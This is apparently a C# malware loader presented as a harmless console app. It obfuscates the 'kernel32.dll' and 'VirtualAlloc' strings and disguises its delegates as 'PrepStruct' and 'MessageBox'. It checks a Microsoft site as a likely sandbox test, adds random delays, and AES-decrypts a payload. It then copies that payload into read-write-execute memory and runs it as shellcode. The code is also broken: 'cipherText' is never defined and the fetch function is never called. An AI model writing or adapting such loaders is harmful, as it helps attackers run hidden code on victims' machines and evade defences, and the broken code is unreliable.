﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Collections;

namespace ConsoleApp1
{

    public class Program
    {
        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }
        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        static extern IntPtr LoadLibrary(string dllName);

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr PrepStruct(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void MessageBox();

        private static string DecryptDataWithAes(string cipherText, string keyBase64, string vectorBase64)
        {
            using (Aes aesAlgorithm = Aes.Create())
            {
                aesAlgorithm.Key = Convert.FromBase64String(keyBase64);
                aesAlgorithm.IV = Convert.FromBase64String(vectorBase64);
                ICryptoTransform decryptor = aesAlgorithm.CreateDecryptor();
                byte[] cipher = Convert.FromBase64String(cipherText);
                using (MemoryStream ms = new MemoryStream(cipher))
                {
                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader(cs))
                        {
                            return sr.ReadToEnd();
                        }
                    }
                }
            }
        }
        public static string FetchContent(string url)
        {
            HttpClient _httpClient = new HttpClient();
            try
            {
                HttpResponseMessage response = _httpClient.GetAsync(url).Result;
                response.EnsureSuccessStatusCode();
                string responseBody = response.Content.ReadAsStringAsync().Result;
                return responseBody;
            }
            catch (HttpRequestException e)
            {
                Console.WriteLine("Error fetching data");
                return null;
            }
        }
        public static void MeasureExecutionTimeAttribute(int minDelayMilliseconds, int maxDelayMilliseconds)
        {
            Console.WriteLine("Time measuring.");
            Random random = new Random();
            int delay = random.Next(minDelayMilliseconds, maxDelayMilliseconds);
            Thread.Sleep(delay);
        }
        public static void UpdateSiteCheckerAttribute()
        {

            var url = "https://www.microsoft.com/en-us/windows";
            using (var httpClient = new HttpClient())
            {
                try
                {
                    var response = httpClient.GetAsync(url).Result;
                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("Microsoft Update site is available.");
                    }
                    else
                    {
                        Console.WriteLine("Microsoft Update site might be having issues");
                        Environment.Exit(3);
                    }
                }
                catch (AggregateException ae)
                {
                    Console.WriteLine("Error checking site availability");
                    Environment.Exit(3);
                }
            }
        }
        public static void Main()
        {
            IntPtr enumPointer = LoadLibrary(System.Text.Encoding.UTF8.GetString(new byte[] { 0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c }));
            IntPtr structPointer = GetProcAddress(enumPointer, System.Text.Encoding.UTF8.GetString(new byte[] { 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63 }));
            PrepStruct windowsStructure = (PrepStruct)Marshal.GetDelegateForFunctionPointer(structPointer, typeof(PrepStruct));
            UpdateSiteCheckerAttribute();
            if (cipherText != null)
            {
                Console.WriteLine("Fetched Content:");
            }
            else
            {
                Console.WriteLine("Unable to read package info.");
                Environment.Exit(3);
            }
            var keyBase64 = "AAAAAAAAAAAAAAAAAAAAAA==";
            var vectorBase64 = "L5nvxFTnmYqxjzuy+x0hCQ==";
            string plainText1 = DecryptDataWithAes(cipherText, keyBase64, vectorBase64);
            MeasureExecutionTimeAttribute(1, 15);
            string first10 = plainText1.Substring(0, 10);
            string last10 = plainText1.Substring(plainText1.Length - 10);
            byte[] buf = Convert.FromBase64String(plainText1);
            MeasureExecutionTimeAttribute(2, 15);
            MeasureExecutionTimeAttribute(5, 15);
            IntPtr windowStructPointer = windowsStructure(IntPtr.Zero, (uint)buf.Length, (uint)StateEnum.MEM_COMMIT, (uint)Protection.PAGE_EXECUTE_READWRITE);
            MeasureExecutionTimeAttribute(3, 15);
            MeasureExecutionTimeAttribute(3, 15);
            Marshal.Copy(buf, 0, windowStructPointer, buf.Length);
            MeasureExecutionTimeAttribute(3, 15);
            MessageBox msgBoxInstance = Marshal.GetDelegateForFunctionPointer<MessageBox>(windowStructPointer);
            MeasureExecutionTimeAttribute(3, 15);
            msgBoxInstance();
        }
    }
}